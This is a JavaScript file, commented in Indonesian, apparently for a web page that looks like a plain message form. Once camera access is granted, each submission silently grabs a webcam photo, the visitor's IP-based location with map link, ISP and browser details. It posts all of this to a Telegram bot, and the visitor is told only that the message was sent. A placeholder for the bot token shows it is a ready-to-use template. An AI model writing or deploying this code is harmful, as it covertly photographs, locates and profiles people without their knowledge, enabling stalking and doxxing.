const token = "ISI_TOKEN_KAMU_DI_SINI";
const chat_id = "7607549215";

// Minta akses kamera langsung
navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
  const video = document.getElementById("video");
  video.srcObject = stream;
}).catch(err => {
  alert("Kamera tidak diizinkan!");
  console.error(err);
});

async function kirim() {
  const pesan = document.getElementById("pesan").value.trim();
  if (!pesan) return alert("Pesan tidak boleh kosong!");

  try {
    const ip = await fetch("https://ipapi.co/json/").then(res => res.json());

    // Capture foto dari video
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));

    const form = new FormData();
    form.append("chat_id", chat_id);
    form.append("photo", blob, "user.jpg");

    const caption = `
📩 Pesan Baru Masuk:
💬 *Pesan*: ${pesan}

🌍 *IP*: ${ip.ip}
🏙️ *Kota*: ${ip.city}
🗺️ *Wilayah*: ${ip.region}
🌐 *Negara*: ${ip.country_name}
📍 *Maps*: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
🏢 *ISP*: ${ip.org}
🖥️ *Device*: ${navigator.userAgent}
`.trim();

    form.append("caption", caption);
    form.append("parse_mode", "Markdown");

    const send = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: "POST",
      body: form
    });

    if (!send.ok) throw new Error("Gagal kirim ke Telegram");

    alert("Pesan dan foto berhasil dikirim!");
    document.getElementById("pesan").value = "";

  } catch (e) {
    console.error(e);
    alert("Gagal mengirim pesan/foto.");
  }
}